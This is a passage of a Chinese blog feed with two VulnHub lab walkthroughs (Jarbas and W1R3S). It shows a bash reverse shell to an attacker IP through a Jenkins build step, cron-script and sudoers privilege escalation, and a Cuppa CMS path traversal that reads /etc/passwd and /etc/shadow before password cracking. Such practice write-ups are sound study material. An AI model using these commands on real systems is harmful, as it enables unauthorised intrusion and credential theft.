解密得到</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230310003705540.png" alt="image-20230310003705540"></p><p>对应的数据如下</p><table><thead><tr><th>user</th><th>passwd</th></tr></thead><tbody><tr><td>tiago</td><td>italia99</td></tr><tr><td>trindade</td><td>vipsu</td></tr><tr><td>eder</td><td>marianna</td></tr></tbody></table><p>用于8080端口登陆，在经过上述对应账密登陆失败后，通过打乱搭配尝试登陆</p><p>最终eder vipsu 登陆 （此处由于数据内容较少没有bp，当数据过多时则需要用bp快速找出正确账号密码）</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310110850713.png" alt="image-20230310110850713"></p><p>在New Item处可以创建一个新项目 尝试创建一个名为test1的项目，在设置项目时看到Build选项中存在<code>Execute shell</code> 此处我们可以通过bash getshell</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310111518081.png" alt="image-20230310111518081"></p><p>getshell语句为：<code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1 </code></p><table><thead><tr><th>命令</th><th>命令详解</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境。</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;192.168.37.135&#x2F;7777</td><td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机192.168.37.135的7777端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p>Bash反弹一句完整的解读过程就是：</p><blockquote><p>Bash产生了一个交互环境和本地主机主动发起与攻击机7777端口建立的连接（即TCP 7777会话连接）相结合，然后在重定向个TCP 7777会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p></blockquote><p>攻击机本地监听7777端口 成功连接</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310113033089.png" alt="image-20230310113033089"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查询shell的权限</p><p><code>sudo -l</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310230354149.png" alt="image-20230310230354149"></p><p>无任何权限，需要提权</p><p>查询定时任务</p><blockquote><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 <code>/etc/crontab</code> 文件和 <code>/etc/cron.*/</code> 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录。</p></blockquote><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310232437353.png" alt="image-20230310232437353"></p><p>存在一个定时任务</p><p>任务解释：每5分钟以root权限执行&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh ，执行的结果将被丢弃</p><p>脚本内容如下  </p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310232715965.png" alt="image-20230310232715965"></p><p>方法一</p><p>将getshell payload 写入&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh  同时监听7776端口待执行后可以获得root权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310233421961.png" alt="image-20230310233421961"></p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310233705929.png" alt="image-20230310233705929"></p><p>方法二</p><p>修改CleaningScript.sh内容，使它能够修改sudoers，给予jenkins免密码执行sudo的权限。并利用crontab定时执行该任务<br><code>echo &quot;echo &#39;jenkins ALL=(ALL) NOPASSWD:ALL&#39; &gt;&gt; /etc/sudoers&quot; &gt;&gt; /etc/script/CleaningScript.sh</code></p><p>sudoers用来保存一些用户，使这些用户可以通过sudo命令来暂时获取root的权限</p><p>成功获得root权限</p><p><img src="http://42.193.172.120:8088/images/2023/03/10/image-20230310233734120.png" alt="image-20230310233734120"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;靶场介绍&quot;&gt;&lt;a href=&quot;#靶场介绍&quot; class=&quot;headerlink&quot; title=&quot;靶场介绍&quot;&gt;&lt;/a&gt;靶场介绍&lt;/h2&gt;&lt;p&gt;靶机名：JARBAS&lt;/p&gt;
&lt;p&gt;Jarbas靶场下载地址: &lt;a href=&quot;https://download.vuln</summary>
      
    
    
    
    
    <category term="vulnhub靶机" scheme="http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>W1R3S</title>
    <link href="http://ljx-go.top/2023/03/10/W1R3S/"/>
    <id>http://ljx-go.top/2023/03/10/W1R3S/</id>
    <published>2023-03-10T13:11:15.000Z</published>
    <updated>2023-04-08T13:52:02.567Z</updated>
    
    <content type="html"><![CDATA[<h3 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h3><p>靶机名：W1R3S</p><p>靶机地址：<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">https://www.vulnhub.com/entry/w1r3s-101,220/</a></p><p>下载地址：<strong>下载（镜像）</strong>：<a href="https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip">https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip</a></p><p>描述：你被雇来对W1R3S做渗透测试。公司个人服务器并报告所有发现。他们要求您获得root权限并找到标志(位于&#x2F;root目录中)。</p><p>目标：得到root权限&amp;找到flag.txt</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>1.主机发现</p><p>开启靶机后用nmap扫描发现靶机ip</p><p><code>sudo nmap -sn 192.168.37.0/24</code> （不知道具体ip可以通过关闭靶机前后分别扫描）</p><p>ip地址为  <code>192.168.37.137</code></p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306232808593.png" alt="image-20230306232808593" style="zoom: 67%;"><p>2.端口扫描</p><p><code>sudo nmap --min-rate 10000 -p- 192.168.37.137</code>  设置–min-rate参数确保扫得全and准确</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306234024911.png" alt="image-20230306234024911"></p><p>识别端口相关信息</p><p><code>sudo nmap -sT -sV -O -p21,22,80,3306 192.168.37.137</code> -sT用TCP协议 -sV获得对应服务的版本信息 -O获得主机信息</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306234448903.png" alt="image-20230306234448903"></p><p><code>sudo nmap -sU -p21,22,80,3306 192.168.37.137</code> -sU用udp协议 (往往开发人员忽略了UDP协议)</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306235136429.png" alt="image-20230306235136429"></p><p>4个端口侧重点：80&gt;21&gt;3306&gt;22</p><p>其中ssh服务 一般是通过暴力破解password  所以为最不可能一项</p><p><code>sudo nmap --script=vuln -p21,22,80,3306 192.168.37.137</code></p><p>利用nmap自带的漏洞扫描对端口进行扫描</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307000604489.png" alt="image-20230307000604489"></p><p>从结果得知21 22端口没有信息  80端口中web服务框架为wordpress 是重点突破的地方</p><p>MAC地址显示VMware 如果是在真实环境中获得的，宿主环境很可能是window系统</p><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><h4 id="测试ftp是否允许匿名登陆"><a href="#测试ftp是否允许匿名登陆" class="headerlink" title="测试ftp是否允许匿名登陆"></a>测试ftp是否允许匿名登陆</h4><p><a href="https://www.bilibili.com/read/cv10444306?from=search">FTP（匿名登录）未授权访问漏洞</a></p><p>FTP的匿名登录一般有三种：<br>1、 用户名：anonymous 密码：Email或者为空<br>2、 用户名：FTP 密码：FTP或者为空<br>3、 用户名：USER 密码：pass</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307003058115.png" alt="image-20230307003058115"></p><p>成功匿名登陆</p><p><strong>注！！！  ftp登陆后 需要输入binary切换一下</strong> </p><p>原因ftp 默认为ascii获取文件内容，当获取的文件为可执行文件时，不输入binary则可能会损坏可执行文件</p><p><strong>ftp文件下载命令 wget +文件名</strong></p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307003500326.png"></p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004356477.png" alt="image-20230307004356477"></p><p>其中 employee-names.txt涉及一些敏感信息泄露 可能对于后续有用</p><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004844476.png" alt="image-20230307004844476"></p><h3 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h3><h4 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h4><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307103605194.png" alt="image-20230307103605194"></p><p>前面得知它是一个wordpress框架，通过目录爆破获得对应框架的路径</p><h4 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h4><p>利用feroxbuster及kali自带字典进行爆破  路径：<code>/usr/share/seclists/</code></p><p><a href="https://blog.csdn.net/Jiajiajiang_/article/details/88638367">kali系统自带字典wordlists简介</a></p><p><code>feroxbuster -u http://192.168.37.137 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></p><p>扫描结果</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004531661.png" alt="image-20230308004531661"></p><p>其中wordpress 与 administrator目录</p><h4 id="Cuppa-CMS"><a href="#Cuppa-CMS" class="headerlink" title="Cuppa CMS"></a>Cuppa CMS</h4><p>先访问<a href="http://192.168.37.137/administrator">http://192.168.37.137/administrator</a> 获得一个CMS安装界面</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004759753.png" alt="image-20230308004759753"></p><p>点击next后出现注册信息</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004837893.png" alt="image-20230308004837893"></p><p>随意填写再次点击next后安装失败   提示没有Administrator权限 此路不通</p><p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004937654.png" alt="image-20230308004937654"></p><p>用searchsploit搜索cuppa cms相关漏洞</p><p><a href="https://blog.csdn.net/qq_63844103/article/details/128405733">【网安神器篇】——searchsploit漏洞利用搜索工具</a> </p><p>查询到相关漏洞描述文件 并用-m参数将一个漏洞利用镜像（副本）到当前工作目录(后面跟漏洞ID号) </p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308110519802.png" alt="image-20230308110519802"></p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308231808038.png" alt="image-20230308231808038"></p><p>get传参访问 没有结果  </p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308231847812.png" alt="image-20230308231847812" style="zoom:50%;"><p>由于$_REQUEST可以用post传参  所以用curl尝试post传参</p><p><code>curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.37.137/administrator/alerts/alertConfigField.php</code></p><p>成功获得&#x2F;etc&#x2F;passwd内容   <a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释</a></p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308232053571.png" alt="image-20230308232053571" style="zoom:67%;"><p>尝试查看&#x2F;etc&#x2F;shadow文件   <a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）</a></p><p><code>curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.37.137/administrator/alerts/alertConfigField.php</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308233232927.png" alt="image-20230308233232927"></p><p>将&#x2F;etc&#x2F;shadow中三个较长的信息收集在一个txt文件内 用john破解</p><p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308234943255.png"></p><p>获得其中两个用户的账号密码，很明显可以看出w1r3s权限更高些</p><p>利用账号密码ssh远程登陆</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309143845639.png" alt="image-20230309143845639"></p><p>成功getshell</p><p>查询权限   <code>sudo -l</code> 显示了允许当前用户使用的命令</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309144316710.png" alt="image-20230309144316710"></p><p>利用sudo提权 <code>sudo /bin/bash</code></p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309144822739.png" alt="image-20230309144822739"></p><p>获得flag.txt  结束本次靶机的练习</p><p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309145240649.png" alt="image-20230309145240649"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;靶场介绍&quot;&gt;&lt;a href=&quot;#靶场介绍&quot; class=&quot;headerlink&quot; title=&quot;靶场介绍&quot;&gt;&lt;/a&gt;靶场介绍&lt;/h3&gt;&lt;p&gt;靶机名：W1R3S&lt;/p&gt;
&lt;p&gt;靶机地址：&lt;a href=&quot;https://www.vulnhub.com/entry/w</summary>
      
    
    
    
    
    <category term="vulnhub靶机" scheme="http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
</feed>
